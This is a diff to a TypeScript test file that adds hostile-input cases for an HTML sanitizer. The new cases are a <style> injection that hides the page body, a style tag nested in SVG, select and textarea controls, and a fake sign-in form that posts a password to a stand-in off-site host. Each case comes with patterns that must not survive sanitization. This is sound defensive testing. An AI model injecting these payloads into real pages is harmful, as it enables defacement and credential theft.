@@ -365,6 +365,37 @@ const hostileCorpus: HostileCase[] = [
     raw: `<javascript:window.${MARK}=1>`,
     forbidden: [/href\s*=\s*["']?\s*javascript:/i],
   },
+  {
+    // No script/handler needed here — the CSP has no style-src, so a
+    // <style> element that just survives sanitization is itself the
+    // exploit: it restyles the whole portal page or the dashboard modal.
+    category: 'forbidden-tag',
+    name: 'style element after a line of prose',
+    raw: `Prose.\n\n<style>body{display:none} .${MARK}{color:red}</style>\n\nMore prose.`,
+    forbidden: [/<style/i, new RegExp(MARK)],
+    mustContain: [/Prose\./, /More prose/],
+  },
+  {
+    category: 'forbidden-tag',
+    name: 'style element nested in svg',
+    raw: `<svg><style>.${MARK}{fill:red}</style><circle r="1"/></svg>`,
+    forbidden: [/<style/i, new RegExp(MARK)],
+    mustContain: [/<circle/],
+  },
+  {
+    // form-action lets this post to any apex subdomain; the form/input/
+    // button tags themselves are the exploit, no javascript: needed.
+    category: 'forbidden-tag',
+    name: 'credential form posting off-site',
+    raw: `<form action="https://${MARK}.example/collect" method="post"><input name="password" type="password"><button type="submit">Sign in</button></form>`,
+    forbidden: [/<form/i, /<input/i, /<button/i, new RegExp(MARK)],
+  },
+  {
+    category: 'forbidden-tag',
+    name: 'select/textarea form controls',
+    raw: `<select name="${MARK}"><option>a</option></select><textarea name="x">payload</textarea>`,
+    forbidden: [/<select/i, /<textarea/i, new RegExp(MARK)],
+  },
 ];
 
 describe('tiles.ts: hostile-input corpus — nothing executable survives', () => {
